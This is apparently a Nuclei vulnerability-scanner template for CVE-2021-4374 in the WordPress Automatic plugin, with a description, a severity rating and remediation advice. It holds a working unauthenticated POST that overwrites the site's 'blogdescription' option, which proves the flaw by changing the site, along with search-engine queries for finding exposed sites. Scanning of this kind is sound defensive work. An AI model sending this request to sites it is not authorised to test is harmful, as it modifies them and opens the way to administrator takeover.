http:
- matchers:
  - part: body_2
    type: word
    words:
    - '{{randstr}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-content/plugins/wp-automatic/process_form.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    field1={{randstr}}&field3=test&field4=test&field5=test&field6=test&blogdescription={{randstr}}

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-4374
info:
  author: intelligent-ears
  classification:
    cpe: cpe:2.3:a:valvepress:wordpress_automatic_plugin:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-4374
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.98666
    epss-score: 0.71572
  description: 'WordPress Automatic Plugin (versions 3.53.2 and below) contains a
    critical vulnerability that allows unauthenticated users to change arbitrary WordPress
    options through the process_form.php script. The vulnerable script uses update_option()
    on all POST parameters without authentication or capability checks, allowing attackers
    to create administrator accounts or modify critical settings. The vulnerability
    can be exploited even if the plugin is deactivated as it''s a standalone script.

    '
  impact: 'Unauthenticated attackers can update arbitrary WordPress options via process_form.php,
    enabling them to create administrator accounts, modify critical settings, or completely
    compromise the WordPress site.

    '
  metadata:
    fofa-query: wp-content/plugins/wp-automatic/
    google-query: inurl:"/wp-content/plugins/wp-automatic/"
    max-request: 2
    product: wp-automatic
    shodan-query: http.html:"wp-content/plugins/wp-automatic/"
    vendor: valvepress
    verified: true
  name: WordPress Automatic Plugin - Unauthenticated Options Change
  reference:
  - https://www.wordfence.com/blog/2021/09/critical-vulnerability-fixed-in-wordpress-automatic-plugin/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-4374
  remediation: 'Upgrade to WordPress Automatic Plugin version 3.53.3 or later, or
    deactivate and delete the plugin.

    '
  severity: critical
  tags: cve,cve2021,wp,wordpress,wp-plugin,wp-automatic,unauth,intrusive,vkev
